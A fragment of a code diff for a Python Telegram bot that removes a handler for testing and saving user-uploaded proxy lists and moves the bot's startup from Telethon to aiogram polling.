-            f"You sent {len(lines)} proxies.\n"
-            f"Maximum allowed is {MAX_PROXIES_FILE} proxies."
-        )
-        active_processes.pop(user_id, None)
-        return
-    
-    proxies_to_test = []
-    for line in lines:
-        line = line.strip()
-        if line:
-            proxy_url = parse_proxy(line)
-            if proxy_url:
-                proxies_to_test.append((line, proxy_url))
-    
-    if not proxies_to_test:
-        await event.reply(
-            "━━━━━━━━━━━━━━\n"
-            "❌ NO VALID PROXIES\n"
-            "━━━━━━━━━━━━━\n\n"
-            "No valid proxies found."
-        )
-        active_processes.pop(user_id, None)
-        return
-    
-    status_msg = await event.reply(f"🍑 Testing {len(proxies_to_test)} proxies...")
-    
-    working_proxies = []
-    
-    for i, (original, url) in enumerate(proxies_to_test, 1):
-        try:
-            await status_msg.edit(f"🍑 Testing proxies... [{i}/{len(proxies_to_test)}]")
-        except:
-            pass
-        
-        is_working, ip = await test_proxy(url)
-        
-        if is_working:
-            working_proxies.append({
-                'original': original,
-                'url': url,
-                'ip': ip
-            })
-        
-        await asyncio.sleep(0.5)
-    
-    proxies_data = await load_json(USER_PROXIES_FILE)
-    current_proxies = proxies_data.get(str_user_id, [])
-    
-    added = []
-    for proxy in working_proxies:
-        exists = any(p['original'] == proxy['original'] for p in current_proxies)
-        if not exists and len(current_proxies) < MAX_PROXIES:
-            current_proxies.append(proxy)
-            added.append(proxy['original'])
-        if len(current_proxies) >= MAX_PROXIES:
-            break
-    
-    if added:
-        proxies_data[str_user_id] = current_proxies
-        await save_json(USER_PROXIES_FILE, proxies_data)
-    
-    response = f"""
-━━━━━━━━━━━━━━━━━━
-✅ PROXIES PROCESSED
-━━━━━━━━━━━━━━━━━━
-
-📊 Total sent: {len(proxies_to_test)}
-🟢 Working: {len(working_proxies)}
-✅ Added to your list: {len(added)}
-📊 Total now: {len(current_proxies)}/{MAX_PROXIES}
-
-"""
-    
-    if added:
-        response += "Added:\n"
-        for proxy in added[:5]:
-            response += f"• `{proxy}`\n"
-        if len(added) > 5:
-            response += f"... and {len(added)-5} more\n"
-    
-    buttons = [[Button.inline("🔙 BACK", b"back_to_main")]]
-    
-    await status_msg.edit(response, buttons=buttons)
-    
-    active_processes.pop(user_id, None)
+            await message.reply(final, parse_mode="Markdown")
 
 # ==================== MAIN ====================
+
 async def main():
     print("""
 Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
 Telegram: @afuonax
-Starting bot...
+Starting bot with aiogram...
 """)
-    
-    await client.start(bot_token=BOT_TOKEN)
-    await client.run_until_disconnected()
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
